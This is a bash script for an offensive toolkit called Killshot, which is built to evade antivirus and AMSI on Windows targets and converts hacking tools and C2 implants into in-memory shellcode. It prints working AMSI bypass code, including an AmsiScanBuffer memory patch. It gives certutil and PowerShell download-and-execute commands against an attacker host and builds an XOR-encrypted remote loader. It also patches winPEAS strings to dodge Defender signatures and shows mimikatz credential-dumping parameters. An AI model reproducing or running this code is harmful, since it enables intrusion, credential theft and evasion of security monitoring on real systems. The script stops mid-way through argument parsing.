#!/bin/bash
# =============================================================
# Killshot - Polymorphic AV/AMSI Bypass Toolkit
# =============================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# ─── Banner ──────────────────────────────────────────────────

show_banner() {
    cat << 'BANNER'

    ▄█   ▄█▄  ▄█   ▄█        ▄█          ▄████████    ▄█    █▄     ▄██████▄      ███
   ███ ▄███▀ ███  ███       ███         ███    ███   ███    ███   ███    ███ ▀█████████▄
   ███▐██▀   ███▌ ███       ███         ███    █▀    ███    ███   ███    ███    ▀███▀▀██
  ▄█████▀    ███▌ ███       ███         ███         ▄███▄▄▄▄███▄▄ ███    ███     ███   ▀
 ▀▀█████▄   ███▌ ███       ███       ▀███████████ ▀▀███▀▀▀▀███▀  ███    ███     ███
   ███▐██▄  ███  ███       ███                ███   ███    ███   ███    ███     ███
   ███ ▀███▄███  ███▌    ▄ ███▌    ▄    ▄█    ███   ███    ███   ███    ███     ███
   ███   ▀█████  █████▄▄██ █████▄▄██  ▄████████▀    ███    █▀     ▀██████▀    ▄████▀

BANNER
}

show_help() {
    show_banner
    echo "  Polymorphic AV/AMSI bypass toolkit"
    echo "  Converts any PE/.NET tool to in-memory shellcode via Donut + runner.exe"
    echo ""
    echo "  COMMANDS"
    echo "    killshot generate [flags] [opts]  Generate specific components (or --all)"
    echo "    killshot tool <name> [opts]       Convert a single tool to shellcode"
    echo "    killshot stager <name> [opts]     Generate PS1 stager for a tool"
    echo "    killshot list                     List available tools and status"
    echo "    killshot check                    Verify toolkit installation"
    echo "    killshot serve [port]             Start HTTP server for workspace"
    echo "    killshot amsi                     Print AMSI bypass one-liner for WinRM/PS"
    echo "    killshot ps1 <file> [port]        XOR-encrypt a PS1 and generate loader stub"
    echo "    killshot winpeas [opts]           Obfuscate winPEAS + convert to shellcode"
    echo "    killshot clean                    Remove all generated files from workspace"
    echo "    killshot help                     Show this help"
    echo ""
    echo "  GENERATE FLAGS (mix and match)"
    echo "    --all, -a              Generate everything (full pipeline)"
    echo "    --implant              C2 implant shellcode (Sliver/MSF)"
    echo "    --runner               Polymorphic runner.exe"
    echo "    --stager               PowerShell stager with AMSI bypass"
    echo "    --inline               Inline stager: no runner PE on disk (beats Bearfoos.A!ml)"
    echo "    --potato <name>        Single potato (GodPotato, PrintSpoofer, BadPotato, EfsPotato, SweetPotato)"
    echo "    --potatoes             All potato exploits"
    echo "    --tool <name>          Single tool to shellcode (see killshot list)"
    echo "    --tools                All offensive tools to shellcode"
    echo "    --loaders              PowerShell tool loaders (Rubeus/Mimikatz PS1 fallback)"
    echo "    --msi                  MSI AppLocker bypass (wraps implant in .msi)"
    echo "    --msbuild              MSBuild XML AppLocker bypass"
    echo "    --installutil          InstallUtil C# AppLocker bypass"
    echo ""
    echo "  GENERATE OPTIONS"
    echo "    -l, --lhost IP         Listener/callback IP         (default: 10.99.0.16)"
    echo "    -p, --lport PORT       C2 listener port             (default: 4444)"
    echo "    -h, --http PORT        HTTP file server port        (default: 8000)"
    echo "    -f, --framework NAME   sliver | msf                 (default: sliver)"
    echo "    -t, --type TYPE        beacon | session (sliver)    (default: beacon)"
    echo "    --proto PROTO          mtls | http | https (sliver) (default: mtls)"
    echo "    -c, --cmd CMD          Custom command for potatoes"
    echo "    --params PARAMS        Custom params for --tool"
    echo "    -o, --output PATH      Output path for --tool/--potato"
    echo ""
    echo "  TOOL OPTIONS"
    echo "    killshot tool <name> [-p params] [-o output]"
    echo ""
    echo "  STAGER OPTIONS"
    echo "    killshot stager <name> [-l LHOST] [-p PORT] [--inline] [-o output.ps1]"
    echo "      --inline    Full in-memory mode (no PE written to disk)"
    echo "      -l IP       Attacker IP  (default: \$LHOST or 10.99.0.16)"
    echo "      -p PORT     HTTP port    (default: 8000)"
    echo "      -o PATH     Output path  (default: \$WORKSPACE/stager_<name>.ps1)"
    echo ""
    echo "  EXAMPLES"
    echo "    killshot generate -l 10.10.14.5 --all            # Full pipeline"
    echo "    killshot generate -l 10.10.14.5 --runner         # Just runner.exe"
    echo "    killshot generate -l 10.10.14.5 --implant        # Just C2 implant"
    echo "    killshot generate -l 10.10.14.5 --stager         # Just stager.ps1"
    echo "    killshot generate -l 10.10.14.5 --runner --stager  # Runner + stager"
    echo "    killshot generate --potato GodPotato             # Single potato"
    echo "    killshot generate --potato SweetPotato           # SweetPotato (newer)"
    echo "    killshot generate --potatoes -l 10.10.14.5       # All potatoes"
    echo "    killshot generate --tool Certify                 # Single tool"
    echo "    killshot generate --tool SharpChrome --params 'logins /browser:edge'  # Edge creds"
    echo "    killshot generate --tool mimikatz --params 'privilege::debug sekurlsa::logonpasswords exit'"
    echo "    killshot generate --tools -l 10.10.14.5          # All tools"
    echo "    killshot winpeas                                 # Obfuscate + shellcode (default)"
    echo "    killshot winpeas --no-donut                      # Obfuscate only, raw .exe"
    echo "    killshot winpeas -o /tmp/wp_obf.exe --no-donut   # Custom output path"
    echo "    killshot generate -l 10.10.14.5 -f msf --all     # Full pipeline (MSF)"
    echo "    killshot stager rubeus -l 10.10.14.5             # Stager for Rubeus"
    echo "    killshot stager sharpup -l 10.10.14.5 --inline  # In-memory SharpUp (no PE on disk)"
    echo "    killshot stager godpotato -l 10.10.14.5         # Stager for GodPotato"
    echo "    killshot amsi                                    # Get AMSI bypass for session"
    echo "    killshot ps1 /workspace/killshot/script.ps1      # Encrypt PS1 for AMSI evasion"
    echo "    killshot list                                    # Show tools"
    echo "    killshot clean                                   # Wipe workspace"
    echo "    killshot serve                                   # HTTP server"
    echo ""
    echo "  ON TARGET"
    echo "    certutil -urlcache -split -f http://LHOST:PORT/runner.exe %TEMP%\\r.exe"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/implant.enc"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/rubeus.enc"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/mimikatz.enc"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/seatbelt.enc"
    echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/godpotato.enc"
    echo "    (any .enc file works — see 'killshot list')"
    echo ""
    echo "  AMSI BYPASS (run in WinRM/PS session before IEX)"
    echo '    $a=[Ref].Assembly.GetType([Text.Encoding]::UTF8.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));$f=$a.GetField([Text.Encoding]::UTF8.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)),[Reflection.BindingFlags]'"'"'NonPublic,Static'"'"');$f.SetValue($null,$true)'
    echo ""
}

# ─── Subcommand dispatch ─────────────────────────────────────

# Resolve SCRIPT_DIR for finding companion scripts
# (handles symlink from /usr/local/bin/killshot)
if [ -L "$0" ]; then
    REAL_PATH="$(readlink -f "$0")"
    SCRIPT_DIR="$(cd "$(dirname "$REAL_PATH")" && pwd)"
fi

# ─── Detect platform ─────────────────────────────────────────

PLATFORM="linux"
if [ -d "/.exegol" ] || [ -f "/opt/.exegol_version" ] || echo "${HOSTNAME:-}" | grep -q "^exegol-"; then
    PLATFORM="exegol"
elif grep -qi "kali" /etc/os-release 2>/dev/null; then
    PLATFORM="kali"
fi

# Auto-detect Go path based on platform
if [ "$PLATFORM" = "exegol" ]; then
    for gp in "$SCRIPT_DIR/go/bin" "/opt/my-resources/bin/go/bin"; do
        [ -f "$gp/go" ] && export PATH="$gp:$PATH" && break
    done
else
    for gp in "$SCRIPT_DIR/go/bin" "/opt/killshot/go/bin" "/usr/local/go/bin"; do
        [ -f "$gp/go" ] && export PATH="$gp:$PATH" && break
    done
fi

# Output directory: fixed location based on platform
# Exegol: /workspace/killshot    Other: ~/killshot
# Also checks ~/.exegol/workspaces/<active>/<dir>/killshot for host-side use
if [ -n "$WORKSPACE" ]; then
    # WORKSPACE env override — use as-is
    true
elif [ -d "/workspace" ]; then
    WORKSPACE="/workspace/killshot"
elif _ew=$(find "$HOME/.exegol/workspaces" -maxdepth 2 -name "killshot" -type d 2>/dev/null | head -1) && [ -n "$_ew" ]; then
    WORKSPACE="$_ew"
else
    WORKSPACE="$HOME/killshot"
fi
mkdir -p "$WORKSPACE" 2>/dev/null

MODE=""
case "${1:-}" in
    generate|gen)
        MODE="generate"; shift;;
    tool)
        MODE="tool"; shift;;
    stager)
        MODE="stager"; shift;;
    list|ls)
        MODE="list"; shift;;
    all)
        MODE="generate"; shift; set -- --all "$@";;
    check|status)
        MODE="check"; shift;;
    serve|http)
        MODE="serve"; shift;;
    amsi)
        MODE="amsi"; shift;;
    ps1)
        MODE="ps1"; shift;;
    winpeas|winPEAS)
        MODE="winpeas"; shift;;
    clean)
        MODE="clean"; shift;;
    help|--help|-help|-h)
        show_help; exit 0;;
    --list)
        MODE="list"; shift;;
    --check|--status)
        MODE="check"; shift;;
    --all)
        MODE="generate";;
    --tool)
        MODE="tool"; shift;;
    --serve)
        MODE="serve"; shift;;
    "")
        show_help; exit 0;;
    -*)
        # Flags without subcommand = generate mode (backwards compat)
        MODE="generate";;
    *)
        # Unknown first arg — could be positional LHOST for generate
        MODE="generate";;
esac

# ─── Mode: list ──────────────────────────────────────────────

if [ "$MODE" = "list" ]; then
    show_banner
    python3 "$SCRIPT_DIR/killshot.py" --list -s "$SCRIPT_DIR"
    exit $?
fi

# ─── Mode: check ─────────────────────────────────────────────

if [ "$MODE" = "check" ]; then
    exec "$SCRIPT_DIR/install.sh" --check
fi

# ─── Mode: tool ──────────────────────────────────────────────

if [ "$MODE" = "tool" ]; then
    TOOL_NAME="$1"
    if [ -z "$TOOL_NAME" ]; then
        echo "Usage: killshot tool <name> [-p params] [-o output.enc]"
        echo ""
        python3 "$SCRIPT_DIR/killshot.py" --list -s "$SCRIPT_DIR"
        exit 1
    fi
    shift
    # Pass remaining args through to killshot.py
    exec python3 "$SCRIPT_DIR/killshot.py" --tool "$TOOL_NAME" -s "$SCRIPT_DIR" "$@"
fi

# ─── Mode: stager ─────────────────────────────────────────────

if [ "$MODE" = "stager" ]; then
    TOOL_NAME="${1:-}"
    [ -n "$TOOL_NAME" ] && shift || true
    STAGER_LHOST="${LHOST:-10.99.0.16}"
    STAGER_PORT="${HTTP_PORT:-8000}"
    STAGER_INLINE=""
    STAGER_OUT=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --inline)          STAGER_INLINE="--inline"; shift;;
            -l|--lhost)        STAGER_LHOST="$2"; shift 2;;
            -p|--port|--http)  STAGER_PORT="$2"; shift 2;;
            -o|--output)       STAGER_OUT="$2"; shift 2;;
            *) shift;;
        esac
    done
    # Prefer runner_c.dat (obfuscated PE blob) over plain runner.exe
    if [ -f "$WORKSPACE/runner_c.dat" ]; then
        RUNNER_FILE="runner_c.dat"
    else
        RUNNER_FILE="runner.exe"
    fi
    ENC_NAME="${TOOL_NAME:-implant}"
    OUT="${STAGER_OUT:-$WORKSPACE/stager_${ENC_NAME}.ps1}"
    cd "$SCRIPT_DIR"
    python3 gen_stager.py \
        --runner-url "http://$STAGER_LHOST:$STAGER_PORT/$RUNNER_FILE" \
        --implant-url "http://$STAGER_LHOST:$STAGER_PORT/${ENC_NAME}.enc" \
        --bypass 6 $STAGER_INLINE \
        -o "$OUT"
    echo "[+] Stager : $OUT"
    echo "[+] Serve  : killshot serve $STAGER_PORT  (from $WORKSPACE)"
    exit $?
fi

# ─── Mode: serve ──────────────────────────────────────────────

if [ "$MODE" = "serve" ]; then
    PORT="${1:-8000}"
    SERVE_DIR="${WORKSPACE:-$(pwd)/killshot}"
    [ ! -d "$SERVE_DIR" ] && SERVE_DIR="$(pwd)"
    echo "[*] Serving $SERVE_DIR on port $PORT"
    echo "[*] Ctrl+C to stop"
    cd "$SERVE_DIR" && exec python3 -m http.server "$PORT"
fi

# ─── Mode: amsi ──────────────────────────────────────────────

if [ "$MODE" = "amsi" ]; then
    AMSI_METHOD="${1:-all}"
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
    echo ""
    echo -e "${BOLD}${CYAN}[*] AMSI Bypass Generator — method: ${AMSI_METHOD}${NC}"
    echo -e "${YELLOW}[!] amsiInitFailed reflection is signatured — use method 2 or 3${NC}"
    echo ""
    python3 - "$AMSI_METHOD" << 'PYEOF'
import random, string, sys

RED="\033[0;31m"; GREEN="\033[0;32m"; YELLOW="\033[1;33m"
BLUE="\033[0;34m"; CYAN="\033[0;36m"; BOLD="\033[1m"; NC="\033[0m"

method = sys.argv[1]

def rv(n=None):
    n = n or random.randint(4,8)
    return '$' + ''.join(random.choices(string.ascii_lowercase, k=n))

def ba(s):
    return '[byte[]](' + ','.join(str(ord(c)) for c in s) + ')'

def char_concat(s):
    return '+'.join(f"[char]{ord(c)}" for c in s)

def split_str(s, chunk=None):
    if chunk is None:
        chunk = random.randint(3, 6)
    parts = [s[i:i+chunk] for i in range(0, len(s), chunk)]
    return '+'.join(f'"{p}"' for p in parts)

def fmt_str(s):
    indices = list(range(len(s)))
    random.shuffle(indices)
    fmt = list('?' * len(s))
    args = []
    for i, idx in enumerate(indices):
        fmt[idx] = '{' + str(i) + '}'
        args.append(f'"{s[idx]}"')
    return '"{0}" -f {1}'.format(''.join(fmt), ','.join(args))

# ── Method 1: amsiInitFailed reflection (classic, now detected) ──────────────
def method1():
    va, vf, vt, vfl = rv(), rv(), rv(), rv()
    p1 = ba("System.Management.Automation.")
    p2 = ba("AmsiUtils")
    fn = split_str("amsiInitFailed")
    bf = split_str("NonPublic,Static")
    lines = [
        f"{va}=[Text.Encoding]::UTF8.GetString({p1})+[Text.Encoding]::UTF8.GetString({p2})",
        f"{vf}={fn}",
        f"{vt}=[Ref].Assembly.GetType({va})",
        f"{vfl}={vt}.GetField({vf},[Reflection.BindingFlags]({bf}))",
        f"{vfl}.SetValue($null,$true)",
    ]
    return lines

# ── Method 2: amsiContext null — patch context pointer to zero ────────────────
def method2():
    vt, vf, vc = rv(), rv(), rv()
    # Build type name via char concat to avoid string match
    type_parts = split_str("System.Management.Automation.AmsiUtils", chunk=random.randint(4,7))
    field_parts = split_str("amsiContext", chunk=random.randint(3,5))
    bf = split_str("NonPublic,Static")
    lines = [
        f"{vt}=[Ref].Assembly.GetType({type_parts})",
        f"{vf}={vt}.GetField({field_parts},[Reflection.BindingFlags]({bf}))",
        f"{vc}={vf}.GetValue($null)",
        f"[Runtime.InteropServices.Marshal]::WriteInt32({vc},0)",
    ]
    return lines

# ── Method 3: AmsiScanBuffer memory patch — xor-split dll+func names ─────────
def method3():
    vl, vp, vo, vb = rv(), rv(), rv(), rv()
    key = random.randint(1, 127)
    def xenc(s):
        enc = [ord(c) ^ key for c in s]
        return f'[byte[]]({",".join(str(b) for b in enc)})'
    dll_enc  = xenc("amsi.dll")
    func_enc = xenc("AmsiScanBuffer")
    k = str(key)
    vk = rv()
    # Use [UIntPtr]::new(6) — [UIntPtr]6 is invalid in PS and causes cast exception
    # Check VirtualProtect return before Marshal.Copy to avoid AccessViolationException
    lines = [
        f"Add-Type -TypeDefinition @'",
        f"using System; using System.Runtime.InteropServices;",
        f"public class P{{",
        f"  [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h,string p);",
        f"  [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string n);",
        f"  [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint f,out uint o);",
        f"}}",
        f"'@",
        f"{vk}={k}",
        f"{vl}=[P]::LoadLibrary([Text.Encoding]::ASCII.GetString(({dll_enc}|%{{$_ -bxor {vk}}})  ))",
        f"{vp}=[P]::GetProcAddress({vl},[Text.Encoding]::ASCII.GetString(({func_enc}|%{{$_ -bxor {vk}}})  ))",
        f"{vo}=0",
        f"if([P]::VirtualProtect({vp},[UIntPtr]::new(6),0x40,[ref]{vo})){{",
        f"  [Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,{vp},6)",
        f"}}",
    ]
    return lines

# ── Method 4: Downgrade via powershell -version 2 ────────────────────────────
def method4():
    return [
        "# Check if PS2 is available (requires .NET 2):",
        "powershell -version 2 -command \"IEX (New-Object Net.WebClient).DownloadString('http://LHOST:PORT/payload.ps1')\"",
        "# Or from within session — spawn child:",
        "Start-Process powershell -ArgumentList '-version 2 -WindowStyle Hidden -Command IEX ...'",
    ]

sep = f"{CYAN}{'─'*60}{NC}"

if method in ('1', 'init', 'initfailed'):
    print(f"{YELLOW}[1] amsiInitFailed reflection (DETECTED by modern Defender){NC}")
    print(sep)
    for l in method1(): print(l)

elif method in ('2', 'ctx', 'context'):
    print(f"{GREEN}[2] amsiContext null (less detected){NC}")
    print(sep)
    for l in method2(): print(l)

elif method in ('3', 'patch', 'mem'):
    print(f"{GREEN}[3] AmsiScanBuffer memory patch (most reliable){NC}")
    print(sep)
    for l in method3(): print(l)

elif method in ('4', 'downgrade', 'ps2'):
    print(f"{YELLOW}[4] PowerShell v2 downgrade (no AMSI in PS2){NC}")
    print(sep)
    for l in method4(): print(l)

else:  # all
    print(f"{YELLOW}[1] amsiInitFailed reflection — SIGNATURED, likely blocked{NC}")
    print(sep)
    for l in method1(): print(l)
    print()
    print(f"{GREEN}[2] amsiContext null — USE THIS{NC}")
    print(sep)
    for l in method2(): print(l)
    print()
    print(f"{GREEN}[3] AmsiScanBuffer patch — USE THIS (most reliable){NC}")
    print(sep)
    for l in method3(): print(l)
    print()
    print(f"{YELLOW}[4] PS2 downgrade (requires .NET 2 installed){NC}")
    print(sep)
    for l in method4(): print(l)
PYEOF
    echo ""
    echo -e "${BLUE}[*]${NC} Usage: killshot amsi [1|2|3|4|all]"
    echo -e "    ${CYAN}killshot amsi 2${NC}   # amsiContext null"
    echo -e "    ${CYAN}killshot amsi 3${NC}   # AmsiScanBuffer patch (most reliable)"
    echo ""
    exit 0
fi

# ─── Mode: ps1 ───────────────────────────────────────────────

if [ "$MODE" = "ps1" ]; then
    PS1_FILE="${1:-}"
    PS1_PORT="${2:-${HTTP_PORT:-8000}}"
    if [ -z "$PS1_FILE" ] || [ ! -f "$PS1_FILE" ]; then
        echo "[!] Usage: killshot ps1 <script.ps1> [http_port]"
        exit 1
    fi
    PS1_BASE="$(basename "$PS1_FILE" .ps1)"
    ENC_OUT="$WORKSPACE/${PS1_BASE}.xps1"
    STUB_OUT="$WORKSPACE/${PS1_BASE}_loader.ps1"

    python3 - "$PS1_FILE" "$ENC_OUT" "$STUB_OUT" "$LHOST" "$PS1_PORT" << 'PYEOF'
import sys, os, random, string

src_path, enc_out, stub_out, lhost, port = sys.argv[1:]
key = random.randint(1, 254)

with open(src_path, 'rb') as f:
    raw = f.read()

xored = bytes(b ^ key for b in raw)
import base64
b64 = base64.b64encode(xored).decode()

with open(enc_out, 'w') as f:
    f.write(b64)

def rv():
    return '$' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))

def xenc(s, k):
    enc = [ord(c) ^ k for c in s]
    return '[byte[]](' + ','.join(str(b) for b in enc) + ')'

def xdec(enc_expr, kvar):
    return f'[Text.Encoding]::ASCII.GetString(({enc_expr}|%{{$_ -bxor {kvar}}}))'

# AMSI bypass: amsiContext null (avoids amsiInitFailed signature)
amsi_key = random.randint(10, 120)
vak = rv()
vat, vaf, vac = rv(), rv(), rv()
type_enc  = xenc("System.Management.Automation.AmsiUtils", amsi_key)
field_enc = xenc("amsiContext", amsi_key)
bf_enc    = xenc("NonPublic,Static", amsi_key)

# Download: obfuscate DownloadString + WebClient
dl_key = random.randint(10, 120)
vdk = rv()
vwc, vraw, vb64 = rv(), rv(), rv()
wc_enc  = xenc("WebClient", dl_key)
ds_enc  = xenc("DownloadString", dl_key)
sys_enc = xenc("System.Net.", dl_key)

vd, vk, vb, vs = rv(), rv(), rv(), rv()
url = f"http://{lhost}:{port}/{os.path.basename(enc_out)}"

stub = f"""# {random.randint(10000,99999)}
{vak}={amsi_key}
{vat}=[Ref].Assembly.GetType({xdec(type_enc, vak)})
{vaf}={vat}.GetField({xdec(field_enc, vak)},[Reflection.BindingFlags]({xdec(bf_enc, vak)}))
{vac}={vaf}.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32({vac},0)
{vdk}={dl_key}
{vwc}=New-Object ({xdec(sys_enc, vdk)}+{xdec(wc_enc, vdk)})
{vraw}={vwc}.({xdec(ds_enc, vdk)})('{url}')
{vd}=[Convert]::FromBase64String({vraw})
{vk}={key}
{vs}=[byte[]]({vd}|%{{$_ -bxor {vk}}})
IEX([Text.Encoding]::UTF8.GetString({vs}))
"""
with open(stub_out, 'w') as f:
    f.write(stub)

print(f"[+] Encrypted: {enc_out}")
print(f"[+] Loader:    {stub_out}")
print(f"[*] XOR key:   {key}")
print(f"")
print(f"[*] Run loader on target:")
print(f"    IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{port}/{os.path.basename(stub_out)}')")
PYEOF
    exit 0
fi

# ─── Mode: clean ─────────────────────────────────────────────

if [ "$MODE" = "clean" ]; then
    echo "[*] Cleaning workspace: $WORKSPACE"
    rm -f "$WORKSPACE"/*.enc "$WORKSPACE"/*.exe "$WORKSPACE"/*.ps1 \
          "$WORKSPACE"/*.msi "$WORKSPACE"/*.xml "$WORKSPACE"/*.cs  \
          "$WORKSPACE"/*.dll "$WORKSPACE"/*.bin "$WORKSPACE"/*.xps1
    echo "[+] Done"
    exit 0
fi

# ─── Mode: winpeas ───────────────────────────────────────────

if [ "$MODE" = "winpeas" ]; then
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

    NO_DONUT=0
    OUT_OVERRIDE=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --no-donut)  NO_DONUT=1; shift;;
            -o|--output) OUT_OVERRIDE="$2"; shift 2;;
            *) shift;;
        esac
    done

    echo ""
    echo -e "${BOLD}${CYAN}[*] winPEAS Obfuscation Pipeline${NC}"
    echo ""

    # Locate winpeas binary
    WPEAS_SRC=""
    for p in \
        "$SCRIPT_DIR/tools/windows/winPEASx64.exe" \
        "$SCRIPT_DIR/tools/windows/winPEAS.exe" \
        "/opt/my-resources/tools/windows/winPEASx64.exe" \
        "/opt/my-resources/tools/windows/winPEAS.exe" \
        "/opt/tools/WinPEAS/winPEASx64.exe" \
        "/opt/tools/WinPEAS/winPEAS.exe" \
        "/opt/tools/PEASS-ng/winPEAS/winPEASx64.exe" \
        "$SCRIPT_DIR/winPEAS.exe"; do
        if [ -f "$p" ]; then
            WPEAS_SRC="$p"
            break
        fi
    done

    if [ -z "$WPEAS_SRC" ]; then
        echo -e "${RED}[!] winPEAS binary not found.${NC}"
        echo -e "${YELLOW}    Drop winPEASx64.exe into: $SCRIPT_DIR/tools/windows/${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+]${NC} Found: ${CYAN}$WPEAS_SRC${NC} ($(du -h "$WPEAS_SRC" | cut -f1))"

    OBF_OUT="${OUT_OVERRIDE:-$WORKSPACE/winpeas_obf.exe}"
    ENC_OUT="${WORKSPACE}/winpeas.enc"

    echo -e "${BLUE}[*]${NC} Applying signature obfuscation..."

    python3 - "$WPEAS_SRC" "$OBF_OUT" << 'OBFPYEOF'
import sys, os, random, string, re

RED   = "\033[0;31m"; GREEN  = "\033[0;32m"; YELLOW = "\033[1;33m"
BLUE  = "\033[0;34m"; CYAN   = "\033[0;36m"; BOLD   = "\033[1m"; NC = "\033[0m"

src_path, out_path = sys.argv[1], sys.argv[2]
data = bytearray(open(src_path, 'rb').read())

def rand_str(n, upper=False, title=False):
    c = string.ascii_uppercase if upper else string.ascii_lowercase
    r = ''.join(random.choices(c, k=n))
    return r.capitalize() if title else r

def patch(data, orig, repl_str, utf8=True, utf16=True):
    count = 0
    if utf8:
        # UTF-8 / ASCII — skip if null-terminated standalone word (assembly #Strings heap entry)
        ob = orig.encode('utf-8')
        rb = repl_str.encode('utf-8')
        i = 0
        while True:
            i = data.find(ob, i)
            if i == -1: break
            # Skip lone null-terminated entries (likely #Strings heap metadata names)
            before = data[i-1:i]
            after  = data[i+len(ob):i+len(ob)+1]
            if after == b'\x00' and (before == b'\x00' or i == 0):
                i += len(ob); continue
            data[i:i+len(ob)] = rb; count += 1; i += len(rb)
    if utf16:
        # UTF-16LE — user strings in .NET #US heap (IL literal strings)
        ob16 = orig.encode('utf-16-le')
        rb16 = repl_str.encode('utf-16-le')
        i = 0
        while True:
            i = data.find(ob16, i)
            if i == -1: break
            data[i:i+len(ob16)] = rb16; count += 1; i += len(rb16)
    return count

# Build replacement table — same-length random strings, consistent per session
token = rand_str(7)          # base 7-char token
token_title = token.capitalize()
token_upper = token.upper()

sigs = [
    # (original, replacement, utf8, utf16)
    # utf8=False: skip #Strings heap (metadata names) to avoid PE corruption
    # utf16=True: patch #US heap (IL user strings) — what Defender detects
    ("winPEAS",       token_title[:7],         False, True),
    ("WinPEAS",       token_title[:7],         False, True),
    ("WINPEAS",       token_upper[:7],         False, True),
    ("winpeas",       token[:7],               False, True),
    ("winPeasAnsi",   rand_str(11, title=True),False, True),
    ("WinPeasAnsi",   rand_str(11, title=True),False, True),
    ("winPeasColor",  rand_str(12, title=True),False, True),
    ("WinPeasColor",  rand_str(12, title=True),False, True),
    ("winPeasBang",   rand_str(11, title=True),False, True),
    ("WinPeasBang",   rand_str(11, title=True),False, True),
    ("carlospolop",   rand_str(11),             False, True),
    ("PEASS-ng",      rand_str(5) + "-ng",      False, True),
    ("peass-ng",      rand_str(5) + "-ng",      False, True),
    ("PEASS",         rand_str(5, upper=True),  False, True),
    ("peass",         rand_str(5),              False, True),
]

total = 0
for orig, repl, do_utf8, do_utf16 in sigs:
    n = patch(data, orig, repl, utf8=do_utf8, utf16=do_utf16)
    if n > 0:
        print(f"{GREEN}[+]{NC}  Patched {CYAN}{orig!r:22}{NC} → {YELLOW}{repl!r}{NC}  ({n} hits)")
        total += n
    else:
        print(f"{BLUE}[-]{NC}  {orig!r:22}  not found (ok)")

os.makedirs(os.path.dirname(os.path.abspath(out_path)), exist_ok=True)
with open(out_path, 'wb') as f:
    f.write(data)

sz = os.path.getsize(out_path)
print(f"\n{GREEN}[+]{NC} Obfuscated binary → {CYAN}{out_path}{NC} ({sz:,} bytes, {total} patches)")
OBFPYEOF

    if [ $? -ne 0 ] || [ ! -f "$OBF_OUT" ]; then
        echo -e "${RED}[!] Obfuscation failed${NC}"
        exit 1
    fi

    if [ "$NO_DONUT" = "1" ]; then
        echo ""
        echo -e "${GREEN}[+]${NC} Done. Obfuscated binary: ${CYAN}$OBF_OUT${NC}"
        echo -e "${YELLOW}[*]${NC} Skipped donut (--no-donut). Transfer and run directly."
        exit 0
    fi

    # Find Donut
    DONUT_PY=""
    for p in "/opt/tools/Empire/venv/bin/python3" "$(which python3 2>/dev/null)"; do
        [ -f "$p" ] && "$p" -c "import donut" 2>/dev/null && DONUT_PY="$p" && break
    done

    if [ -z "$DONUT_PY" ]; then
        echo -e "${YELLOW}[!]${NC} Donut not found — obfuscated binary only: ${CYAN}$OBF_OUT${NC}"
        echo -e "${YELLOW}[*]${NC} Install: pip3 install donut-shellcode"
        exit 0
    fi

    echo ""
    echo -e "${BLUE}[*]${NC} Converting obfuscated binary to shellcode via Donut..."

    "$DONUT_PY" - "$OBF_OUT" "$ENC_OUT" << 'DONUTPYEOF'
import sys, os, base64
import donut

src, enc_out = sys.argv[1], sys.argv[2]
GREEN = "\033[0;32m"; RED = "\033[0;31m"; CYAN = "\033[0;36m"; NC = "\033[0m"

sc = donut.create(file=src, arch=2)
if not sc:
    print(f"{RED}[!] Donut failed{NC}"); sys.exit(1)

with open(enc_out, 'w') as f:
    f.write(base64.b64encode(sc).decode())

print(f"{GREEN}[+]{NC} Shellcode → {CYAN}{enc_out}{NC} ({len(sc):,} bytes raw / {os.path.getsize(enc_out):,} bytes b64)")
DONUTPYEOF

    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] Donut conversion failed${NC}"
        exit 1
    fi

    rm -f "$OBF_OUT"

    echo ""
    echo -e "${GREEN}============================================${NC}"
    echo -e "${GREEN}[+] winPEAS obfuscation + shellcode done!${NC}"
    echo -e "${GREEN}============================================${NC}"
    echo ""
    echo -e "${BLUE}[*]${NC} Serve:  ${CYAN}cd $WORKSPACE && python3 -m http.server 8000${NC}"
    echo -e "${BLUE}[*]${NC} On target:"
    echo -e "    ${YELLOW}certutil -urlcache -split -f http://LHOST:8000/runner.exe %TEMP%\\r.exe${NC}"
    echo -e "    ${YELLOW}%TEMP%\\r.exe -remote http://LHOST:8000/winpeas.enc${NC}"
    echo ""
    exit 0
fi

# ─── Mode: generate ──────────────────────────────────────────

LHOST="10.99.0.16"
LPORT="4444"
HTTP_PORT="8000"
FRAMEWORK="sliver"
IMPLANT_TYPE="beacon"
SLIVER_PROTO="mtls"
POTATO_CMD_OVERRIDE=""
TOOL_PARAMS_OVERRIDE=""
OUTPUT_OVERRIDE=""
SINGLE_POTATO=""
SINGLE_TOOL=""

# Component flags (0 = skip, 1 = generate)
GEN_ALL=0
GEN_IMPLANT=0
GEN_RUNNER=0
GEN_STAGER=0
GEN_POTATOES=0
GEN_TOOLS=0
GEN_LOADERS=0
GEN_MSI=0
GEN_MSBUILD=0
GEN_INSTALLUTIL=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        -a|--all)       GEN_ALL=1; shift;;
        --implant)      GEN_IMPLANT=1; shift;;
        --runner)       GEN_RUNNER=1; shift;;
        --stager)       GEN_STAGER=1; shift;;
        --inline)       STAGER_INLINE=1; shift;;
